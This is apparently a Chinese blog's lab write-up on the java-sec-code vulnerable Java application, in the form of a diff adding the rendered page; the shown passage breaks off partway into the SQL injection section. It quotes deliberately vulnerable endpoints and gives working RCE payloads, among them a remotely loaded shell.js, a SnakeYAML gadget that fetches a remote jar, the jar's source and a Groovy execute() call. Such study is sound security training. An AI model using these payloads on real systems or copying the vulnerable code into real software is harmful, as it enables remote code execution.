@@ -1,0 +1,1636 @@
+<!DOCTYPE html>
+<html  lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg">
+    <script>
+    ;(function () {
+      const prefersDark =
+        window.matchMedia &&
+        window.matchMedia('(prefers-color-scheme: dark)').matches
+      const setting = localStorage.getItem('vueuse-color-scheme') || 'auto'
+      if (setting === 'dark' || (prefersDark && setting !== 'light'))
+        document.documentElement.classList.toggle('dark', true)
+    })()
+    </script>
+  <style type="text/css">
+    :root { color-scheme: light dark; --va-c-bg: #fff; }
+    html.dark { --va-c-bg: #000; }
+    html { background-color: var(--va-c-bg); }
+  </style><style id="valaxy-fouc">body{opacity:0!important}</style><style>body{transition:opacity .15s ease}</style><noscript><style>body{opacity:1!important}</style></noscript><script>(function foucGuardScript(maxDuration) {
+  var done = 0;
+  function reveal() {
+    if (done) return;
+    done = 1;
+    var s = document.getElementById("valaxy-fouc");
+    if (s) s.remove();
+  }
+  function check() {
+    var links = document.querySelectorAll('link[rel="stylesheet"]');
+    for (var i = 0; i < links.length; i++) {
+      if (!links[i].sheet) return;
+    }
+    reveal();
+  }
+  new MutationObserver(check).observe(document.head, {
+    childList: true,
+    attributes: true,
+    attributeFilter: ["media", "rel"]
+  });
+  addEventListener("load", reveal);
+  if (maxDuration)
+    setTimeout(reveal, maxDuration);
+})(5000)</script>
+    <script>
+    const locale = localStorage.getItem('valaxy-locale') || 'zh-CN';
+    document.documentElement.setAttribute('lang', locale);
+    </script>
+    
+  <script type="module" crossorigin src="/assets/index.DMmPyM9k.js"></script>
+  <link rel="modulepreload" crossorigin href="/assets/rolldown-runtime.CPPQDwIl.js">
+  <link rel="modulepreload" crossorigin href="/assets/framework.DfD1zdSt.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-i18n.BSMUyWAh.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/@vueuse/motion.B1bNFY-Z.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/dayjs.Do72Hm6d.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/pinia.CMOAtTts.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/vue-router.DZdD3Cav.js">
+  <link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+  <link rel="modulepreload" crossorigin href="/assets/chunks/nprogress.CQax14yo.js">
+  <link rel="stylesheet" crossorigin href="/assets/style.BqWFzkuS.css">
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.BQhdFMY1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_AMS-Regular.DMm9YOAa.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.Dq_IR9rO.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Bold.BEiXGLvX.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.Di6jR-x-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Caligraphic-Regular.CTRA-rTL.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.CL6g_b3V.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Bold.BsDP51OF.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.CTYiF6lA.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Fraktur-Regular.Dxdc4cR9.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Cx986IdX.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Bold.Jm3AIy58.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.DxDJ3AOS.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-BoldItalic.SpSLRI95.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.NWA7e6Wa.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Italic.BMLOBm91.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.B22Nviop.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Main-Regular.Dr94JaBh.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.CZnvNsCZ.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-BoldItalic.iY-2wyZ7.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.t53AETM-.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Math-Italic.DA0__PXp.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.D1sUS0GD.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Bold.DbIhKOiC.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.C3H0VqGB.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Italic.DN2j7dab.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.DDBCnlJ7.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_SansSerif-Regular.CS6fqUqJ.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D3wIWfF6.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Script-Regular.D5yQViql.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.mCD8mA8B.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size1-Regular.C195tn64.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.Dy4dx90m.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size2-Regular.oD1tc_U0.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size3-Regular.CTq5MqoE.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.Dl5lxZxV.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Size4-Regular.BF-4gkZK.woff" as="font" type="font/woff" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.CO6r4hn1.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/assets/KaTeX_Typewriter-Regular.C0xS9mPB.woff" as="font" type="font/woff" crossorigin>
+<link rel="modulepreload" crossorigin href="/assets/theme.DMgGaAyl.js">
+<link rel="preload" href="/assets/none.DLM1AMsD.jpg" as="image">
+<link rel="preload" href="/assets/bg-img.kXdNMxcF.jpg" as="image">
+<link rel="preload" href="/assets/sidebar-bg-img.mp54gEws.webp" as="image">
+<link rel="modulepreload" crossorigin href="/assets/java-sec-code.DPmT-M_j.js">
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>java-sec-code - 北沐城歌</title>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&display=swap">
+<meta property="og:locale:alternate" content="en">
+<meta name="description" content="山行野宿，孤身万里">
+<meta property="og:description" content="山行野宿，孤身万里">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:site_name" content="北沐城歌">
+<meta property="og:title" content="java-sec-code">
+<meta property="og:image" content="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://kinsey973.github.io/">
+<link rel="icon" href="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202411051423199.svg" type="image/svg+xml">
+<meta name="generator" content="Valaxy 0.28.7">
+<meta name="theme-color" content="#fff">
+<meta name="msapplication-TileColor" content="#fff">
+<meta name="twitter:card" content="summary_large_image">
+</head>
+<body>
+  <div id="app"><!--[--><!--[--><!--[--><!----><!----><div class="yun-page-header-gradient"></div><div class="yun-nav-menu z-$yun-z-nav-menu fixed bg-transparent" data-v-1791e522><div class="inline-flex justify-start items-center flex-1" data-v-1791e522><button type="button" class="vt-hamburger menu-btn sidebar-toggle leading-4 size-12 lg:hidden" aria-label="mobile navigation" aria-expanded="false" inline-flex cursor="pointer" hover="bg-white/80 dark:bg-black/80" z="$yun-z-menu-btn" data-v-1791e522><span class="vt-hamburger-container"><span class="vt-hamburger-top"></span><span class="vt-hamburger-middle"></span><span class="vt-hamburger-bottom"></span></span></button><a href="/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 data-v-1791e522><!--[--><div class="size-6 i-ri-home-4-line"></div><!--]--></a><div class="hidden lg:contents" data-v-1791e522><!--[--><a href="/posts/" class="va-link size-12 inline-flex-center cursor-pointer z-$yun-z-nav-menu text-$va-c-text" hover="bg-white/80 dark:bg-black/80 op-100" op-80 title="menu.posts" data-v-1791e522><!--[--><div class="size-6 i-ri-article-line"></div><!--]--></a><!--]--></div></div><div class="flex flex-1 flex-center" data-v-1791e522><div flex="~ center col h-full" class="nav-menu-title-container cursor-pointer" data-v-1791e522><!----><span class="font-light truncate">北沐城歌</span></div></div><div class="inline-flex-center justify-end items-center flex-1" data-v-1791e522><button class="yun-icon-btn rounded-none! hidden sm:inline-flex" title="切换语言" style="color:var(--va-c-text);" data-v-1791e522><div i-ri-translate class="transition transform"></div></button><button class="yun-icon-btn yun-toggle-dark rounded-none!" title="切换深色模式" data-v-1791e522><div i="ri-sun-line dark:ri-moon-line"></div></button><!--[--><button class="yun-search-btn yun-icon-btn popup-trigger rounded-none! size-12 inline-flex justify-center items-center" text="xl $va-c-text" title="搜索"><div i-ri-search-line op-80 hover="op-100"></div></button><!----><!--]--></div></div><!----><!----><!----><!--[--><div class="yun-bg"></div><!--]--><!----><a href="#" class="back-to-top yun-icon-btn bg-$va-c-bg-soft shadow-md"><div class="size-8" i-ri-arrow-up-s-line></div><svg class="progress-circle-container" viewBox="0 0 100 100"><circle stroke-dasharray="301.59289474462014 301.59289474462014" stroke-dashoffset="301.59289474462014" stroke="currentColor" stroke-width="2" stroke-linecap="round" class="progress-circle" cx="50" cy="50" r="48" fill="none"></circle></svg></a><!--]--><!--[--><meting-js fixed="true" id="2049540645" server="netease" type="song" mini="true" mutex="false" listFolded="false" style=""></meting-js><!--]--><!----><!--]--><div class="min-h-screen flex flex-col"><div class="mt-12 md:mt-24 yun-layout-wrapper__content"><!--[--><div class="yun-layout-left gap-4 sticky top-$yun-margin-top w-80"><!--[--><div class="yun-card flex-center rounded-2 overflow-hidden p-4 min-h-sm" flex="~ col gap-1" min-h="100px" bg="$va-c-bg-light"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><div class="site-info gap-1 items-center text-center" flex="~ col" p="t-8"><a href="/about" class="site-author-avatar inline-flex-center"><div class="relative yun-author-avatar"><div class="absolute size-full avatar-bg bg-image-$yun-home-hero-image-background-image filter-blur-2xl op-30"></div><img class="rounded-full size-full bg-white dark:bg-white/20 p-1 m-0 absolute" src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410261321057.png" alt="avatar"><span class="site-author-status absolute" title="The moonlight is beautiful.">💛</span></div></a><a href="/about" class="site-author-name font-black font-serif text-$va-c-text op-80 hover:op-100 flex-center">北歌</a><a href="/about/site" class="site-name text-lg leading-loose">北沐城歌</a><h4 class="site-subtitle block op-70" text="xs">北沐城歌|北歌的技术分享</h4><div class="site-description">山行野宿，孤身万里</div></div><div class="yun-gradient-line my-2 op-20"></div><nav class="site-nav" text-xl mt-2><a href="/archives/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="归档" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-archive-line"></div><div class="text-2xl icon-active i-ri-archive-fill"></div><span class="text-xs">归档</span></div><span class="count text-base text-black/80 dark:text-white/80">41</span></a><a href="/categories/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="分类" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-folder-2-line"></div><div class="text-2xl icon-active i-ri-folder-2-fill"></div><span class="text-xs">分类</span></div><span class="count text-base text-black/80 dark:text-white/80">6</span></a><a href="/tags/" class="post-classify-nav-item gap-1 w-20 p-2 rounded transition op-80" flex="~ col center" title="标签" hover="bg-$va-c-bg-soft op-100"><div flex="~ col" class="text-$va-c-text inline-flex-center gap-1"><div class="text-2xl icon-default i-ri-price-tag-3-line"></div><div class="text-2xl icon-active i-ri-price-tag-3-fill"></div><span class="text-xs">标签</span></div><span class="count text-base text-black/80 dark:text-white/80">26</span></a></nav><div class="yun-gradient-line my-2 op-20"></div><div class="links-of-author"><!--[--><a class="links-of-author-item yun-icon-btn" rel="noopener" href="/atom.xml" title="RSS" target="_blank" style="color:orange;"><div class="i-ri-rss-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://music.163.com/#/user/home?id=3954596483" title="网易云音乐" target="_blank" style="color:#C20C0C;"><div class="i-ri-netease-cloud-music-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://qm.qq.com/cgi-bin/qm/qr?k=kZJzggTTCf4SpvEQ8lXWoi5ZjhAx0ILZ&amp;jump_from=webapi" title="QQ 2409101203" target="_blank" style="color:#12B7F5;"><div class="i-ri-qq-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://github.com/kinsey973" title="GitHub" target="_blank" style="color:#6e5494;"><div class="i-ri-github-line icon"></div></a><a class="links-of-author-item yun-icon-btn" rel="noopener" href="https://travellings.link" title="Travelling" target="_blank" style="color:white;"><div class="i-ri-train-line icon"></div></a><!--]--></div><div class="yun-gradient-line my-2 op-20"></div><div class="links flex-center"><!--[--><a href="/links/" class="va-link link-item yun-icon-btn" inline-flex title="网络世界的小伙伴们" style="color:hotpink;"><!--[--><div class="i-ri-open-arm-line icon size-6"></div><!--]--></a><a class="va-link link-item yun-icon-btn" inline-flex title="我的旧博客" style="color:#e16f00;" href="https://kinseyy.github.io/" target="_blank"><!--[--><div class="i-ri-quill-pen-line icon size-6"></div><!--]--><!----></a><a href="/categories/" class="va-link link-item yun-icon-btn" inline-flex title="分类" style="color:#f5f5f5;"><!--[--><div class="i-ri-apps-line icon size-6"></div><!--]--></a><a href="/tags/" class="va-link link-item yun-icon-btn" inline-flex title="标签" style="color:#f5f5f5;"><!--[--><div class="i-ri-bookmark-3-line icon size-6"></div><!--]--></a><!--]--></div><!--]--></div><!----></div><template></template><!--]--></div><main class="yun-main lt-md:w-full" flex="~ center"><!--[--><div class="content w-full md:w-3xl lg:w-2xl xl:w-2xl 2xl:w-4xl" flex="~ col grow" p="lt-md:0"><div class="yun-card flex-center rounded-2 overflow-hidden" flex="col" min-h="100px" bg="$va-c-bg-light" m="0"><!----><!----><div class="yun-card-body relative" w="full" flex="~ col" items="center"><!--[--><!----><div class="mt-8 mb-4"><!--[--><header class="post-header"><h1 p="2" text="2xl center" font="serif black" style="color:" class="post-title flex-center"><!----><span inline-flex class="leading-none">java-sec-code</span></h1></header><!--]--></div><!--[--><!--[--><!--[--><!--[--><!----><div flex="~ center" text="sm" class="post-meta-col post-meta gap-4"><div class="post-time flex items-center gap-4"><span class="posted-time inline-flex-center gap-1" title="发表于2025-06-26 20:58:52"><div class="inline-block" i-ri-calendar-line></div><time class="op-80">2025-06-26</time></span><!----></div><!--[--><span id="busuanzi_container_page_pv"> 本文总阅读量 <span id="busuanzi_value_page_pv"></span> 次 </span><!--]--><div class="inline-flex-center gap-4"><div class="inline-flex-center post-counter gap-4"><span class="word-count inline-flex-center gap-1" title="本文字数"><div class="inline-block" i-ri-file-word-line></div><span class="op-80">10.9k</span></span><span class="reading-time inline-flex-center gap-1" title="阅读时长"><div i-ri-timer-line></div><time class="op-80">46m</time></span></div><!----><!----></div></div><!--]--><!----><div class="inline-flex mt-2" text="sm" py="1"><a href="/categories?category=%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0" class="transition post-category inline-flex-center text-xs border-$va-c-divider" px-2 h="7" border rounded-full hover="bg-blue-500 text-white"><div m="x-1" inline-flex i-ri-folder-2-line></div><span>学习笔记</span></a><span mx="2"></span><div class="post-tags inline-flex" items="center" gap="1" flex="wrap 1" justify="end"><!--[--><a href="/tags/?tag=java" class="transition post-tag inline-flex-center text-xs border-$va-c-divider" px-2 h="7" rounded-full border hover="bg-blue-500 text-white"><span>java</span></a><!--]--></div></div><!--]--><!--]--><!--]--><div p="x-4 b-8" class="sm:px-6 lg:px-12 xl:px-16" w="full"><!--[--><!--]--><!--[--><article class="markdown-body"><!--[--><!----><!----><!--[--><!--]--><!--[--><p>摘要：靶场需访问<a href="http://localhost:8080/index" target="_blank" rel="noreferrer">http://localhost:8080/index</a> 默认账号密码为admin admin123 题目在源码里（亏我找半天） 由于后面环境是docker开的，计算器可能弹不出来 RCE 1. /rce/runtime/exec 命令执行：通过调用 Runtime.getRuntime.e。</p><p>&lt;!-- more --&gt;</p><p>靶场需访问<a href="http://localhost:8080/index" target="_blank" rel="noreferrer">http://localhost:8080/index</a></p><p>默认账号密码为admin admin123</p><p>题目在源码里（亏我找半天）</p><p>由于后面环境是docker开的，计算器可能弹不出来</p><h3 id="rce" tabindex="-1">RCE <a class="header-anchor" href="#rce" aria-label="Permalink to &quot;RCE&quot;">​</a></h3><h4 id="_1-rce-runtime-exec" tabindex="-1">1. /rce/runtime/exec <a class="header-anchor" href="#_1-rce-runtime-exec" aria-label="Permalink to &quot;1. /rce/runtime/exec&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@GetMapping(&quot;/runtime/exec&quot;)
+    public String CommandExec(String cmd) {
+        Runtime run = Runtime.getRuntime();
+        StringBuilder sb = new StringBuilder();
+
+        try {
+            Process p = run.exec(cmd);
+            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
+            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
+            String tmpStr;
+
+            while ((tmpStr = inBr.readLine()) != null) {
+                sb.append(tmpStr);
+            }
+
+            if (p.waitFor() != 0) {
+                if (p.exitValue() == 1)
+                    return &quot;Command exec failed!!&quot;;
+            }
+
+            inBr.close();
+            in.close();
+        } catch (Exception e) {
+            return e.toString();
+        }
+        return sb.toString();
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>命令执行</strong>：通过调用 <code>Runtime.getRuntime().exec(cmd)</code> 执行传入的命令，这会启动一个新的子进程来执行该命令。</p><p><strong>输入流处理</strong>：使用 <code>BufferedInputStream</code> 和 <code>BufferedReader</code> 从子进程的标准输出流中读取命令执行的结果。这些结果会被累积到一个 <code>StringBuilder</code> 中。</p><p><strong>异常捕获</strong>：如果执行过程中发生异常，捕获并返回异常的字符串描述。</p><p><strong>退出码处理</strong>：在命令执行完成后，检查子进程的退出码。如果退出码不为零且为 1，则表示命令执行失败。</p><p><strong>返回结果</strong>：如果命令执行成功，返回命令的输出内容；如果发生错误，则返回错误信息。</p><p>我们可以通过Runtime.getRuntime()这个方法来进行命令执行，在该代码里它通过传入cmd变量进行命令执行</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>?cmd=whoami
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062003249.png" alt="image-20241206200351163" loading="lazy" decoding="async"></figure><h4 id="_2-rce-processbuilder" tabindex="-1">2./rce/ProcessBuilder <a class="header-anchor" href="#_2-rce-processbuilder" aria-label="Permalink to &quot;2./rce/ProcessBuilder&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java"> @GetMapping(&quot;/ProcessBuilder&quot;)
+    public String processBuilder(String cmd) {
+        StringBuilder sb = new StringBuilder();
+        try {
+            String[] arrCmd = {&quot;/bin/sh&quot;, &quot;-c&quot;, cmd};
+            ProcessBuilder processBuilder = new ProcessBuilder(arrCmd);
+            Process p = processBuilder.start();
+            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
+            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
+            String tmpStr;
+
+            while ((tmpStr = inBr.readLine()) != null) {
+                sb.append(tmpStr);
+            }
+        } catch (Exception e) {
+            return e.toString();
+        }
+
+        return sb.toString();
+    }
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p><strong>命令执行</strong>： <code>String[] arrCmd = {&quot;/bin/sh&quot;, &quot;-c&quot;, cmd};</code> 通过 <code>ProcessBuilder</code> 启动一个新的 shell 进程，执行传入的命令 <code>cmd</code>。这里使用 <code>-c</code> 选项告诉 shell 执行字符串中的命令。</p><p><strong>启动进程</strong>： <code>Process p = processBuilder.start();</code> 启动进程后，获取该进程的标准输出流并读取其内容。</p><p><strong>读取输出</strong>： 通过 <code>BufferedInputStream</code> 和 <code>BufferedReader</code> 逐行读取进程的输出并存储在 <code>StringBuilder</code> 中。</p><p><strong>异常处理</strong>： 如果命令执行失败或抛出异常，会返回异常的字符串表示。</p><p>该代码通过get请求传入一个cmd，然后利用ProcessBuilder这个类调用系统进程来命令执行</p><p>注意，在windows系统里</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>String[] arrCmd = {&quot;cmd.exe&quot;, &quot;/c&quot;, cmd};
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们需要在源代码中修改，不然命令执行会报错</p><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202412062024910.png" alt="image-20241206202436880" loading="lazy" decoding="async"></figure><h4 id="_3-rce-jscmd" tabindex="-1">3./rce/jscmd <a class="header-anchor" href="#_3-rce-jscmd" aria-label="Permalink to &quot;3./rce/jscmd&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @GetMapping(&quot;/jscmd&quot;)
+    public void jsEngine(String jsurl) throws Exception{
+        // js nashorn javascript ecmascript
+        ScriptEngine engine = new ScriptEngineManager().getEngineByName(&quot;js&quot;);
+        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
+        String cmd = String.format(&quot;load(\&quot;%s\&quot;)&quot;, jsurl);
+        engine.eval(cmd, bindings);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p>我们可以看到它接收一个名为 <code>jsurl</code> 的参数；</p><p>然后使用 Nashorn JavaScript 引擎执行传入 URL 所加载的 JavaScript 脚本。</p><p>由于命令无回显，我们可以通过报错来判断</p><p>shell.js</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+</code></pre><button class="code-block-unfold-btn"></button></div><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>/rce/jscmd?jsurl=http://ip/shell.js
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505222139928.png" alt="image-20250522213856792" loading="lazy" decoding="async"></figure><p>说不存在clac.exe，的确不存在，这说明命令成功执行</p><h4 id="_4-rce-vuln-yarm" tabindex="-1">4./rce/vuln/yarm <a class="header-anchor" href="#_4-rce-vuln-yarm" aria-label="Permalink to &quot;4./rce/vuln/yarm&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">   @GetMapping(&quot;/vuln/yarm&quot;)
+    public void yarm(String content) {
+        Yaml y = new Yaml();
+        y.load(content);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><p><code>SnakeYaml</code>是用来解析yaml的格式，可以用于Java对象的序列化、反序列化。该代码利用SnakeYAML存在的反序列化漏洞来rce，在解析恶意 yml 内容时会完成指定的动作，实现命令执行。我们所加载的yaml文件如下：</p><div class="language-yaml"><button title="Copy code" class="copy"></button><span class="lang">yaml</span><pre><code class="language-yaml">!!javax.script.ScriptEngineManager [
+  !!java.net.URLClassLoader [[
+    !!java.net.URL [&quot;http://127.0.0.1/yaml-payload.jar&quot;]
+  ]]
+]
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>jar是我们远程加载的恶意文件，源码如下</p><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">package artsploit;
+
+import javax.script.ScriptEngine;
+import javax.script.ScriptEngineFactory;
+import java.io.IOException;
+import java.util.List;
+
+public class AwesomeScriptEngineFactory implements ScriptEngineFactory {
+
+    public AwesomeScriptEngineFactory() {
+        try {
+            Runtime.getRuntime().exec(&quot;whoami&quot;);
+            Runtime.getRuntime().exec(&quot;calc.exe&quot;);
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    @Override
+    public String getEngineName() {
+        return null;
+    }
+
+    @Override
+    public String getEngineVersion() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getExtensions() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getMimeTypes() {
+        return null;
+    }
+
+    @Override
+    public List&lt;String&gt; getNames() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageName() {
+        return null;
+    }
+
+    @Override
+    public String getLanguageVersion() {
+        return null;
+    }
+
+    @Override
+    public Object getParameter(String key) {
+        return null;
+    }
+
+    @Override
+    public String getMethodCallSyntax(String obj, String m, String... args) {
+        return null;
+    }
+
+    @Override
+    public String getOutputStatement(String toDisplay) {
+        return null;
+    }
+
+    @Override
+    public String getProgram(String... statements) {
+        return null;
+    }
+
+    @Override
+    public ScriptEngine getScriptEngine() {
+        return null;
+    }
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>整个脚本也都比较简单，就是实现了ScriptEngineFactory接口，然后调用Runtime.getRuntime().exec执行命令。</p><p>payload链接：<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noreferrer">https://github.com/artsploit/yaml-payload</a></p><p>打包为jar</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>javac src/artsploit/AwesomeScriptEngineFactory.java
+jar -cvf yaml-payload.jar -C src/ .
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>&lt;!-- image: image-20250525193848130 (local Typora path, not available on build server) --&gt;</p><p>漏洞修复</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>    @GetMapping(&quot;/sec/yarm&quot;)
+    public void secYarm(String content) {
+        Yaml y = new Yaml(new SafeConstructor());
+        y.load(content);
+    }
+</code></pre><button class="code-block-unfold-btn"></button></div><h4 id="_5-rce-groovy" tabindex="-1">5./rce/groovy <a class="header-anchor" href="#_5-rce-groovy" aria-label="Permalink to &quot;5./rce/groovy&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">@GetMapping(&quot;groovy&quot;)
+public void groovyshell(String content) {
+    GroovyShell groovyShell = new GroovyShell();
+    groovyShell.evaluate(content);
+}
+
+</code></pre><button class="code-block-unfold-btn"></button></div><p>Groovy是一种基于JVM（Java虚拟机）的敏捷开发语言，它结合了Python、Ruby和Smalltalk的许多强大的特性，Groovy 代码能够与 Java 代码很好地结合，也能用于扩展现有代码。由于其运行在 JVM 上的特性，Groovy 可以使用其他 Java 语言编写的库。</p><p>执行命令</p><div class="language-"><button title="Copy code" class="copy"></button><span class="lang"></span><pre><code>/rce/groovy?content=&quot;calc.exe&quot;.execute()
+</code></pre><button class="code-block-unfold-btn"></button></div><figure><img src="https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202505251952938.png" alt="image-20250525195244895" loading="lazy" decoding="async"></figure><p>由于靶场是在docker搭建的，所以弹不出计算器，会提示不存在这个文件</p><h3 id="sql注入" tabindex="-1">SQL注入 <a class="header-anchor" href="#sql注入" aria-label="Permalink to &quot;SQL注入&quot;">​</a></h3><h4 id="_1-sqli-jdbc-vuln" tabindex="-1">1./sqli/jdbc/vuln <a class="header-anchor" href="#_1-sqli-jdbc-vuln" aria-label="Permalink to &quot;1./sqli/jdbc/vuln&quot;">​</a></h4><div class="language-java"><button title="Copy code" class="copy"></button><span class="lang">java</span><pre><code class="language-java">    @RequestMapping(&quot;/jdbc/vuln&quot;)
+    public String jdbc_sqli_vul(@RequestParam(&quot;username&quot;) String username) {
+
+        StringBuilder result = new StringBuilder();
+
+        try {
+            Class.forName(driver);
+            Connection con = DriverManager.getConnection(url, user, password);
+
+            if (!con.isClosed())
+                System.out.println(&quot;Connect to database successfully.&quot;);
+
+            // sqli vuln code
+            Statement statement = con.createStatement();
+            String sql = &quot;select * from users where username = &#39;&quot; + username + &quot;&#39;&quot;;
+            logger.info(sql);
+            ResultSet rs = statement.executeQuery(sql);
+
+            while (rs.next()) {
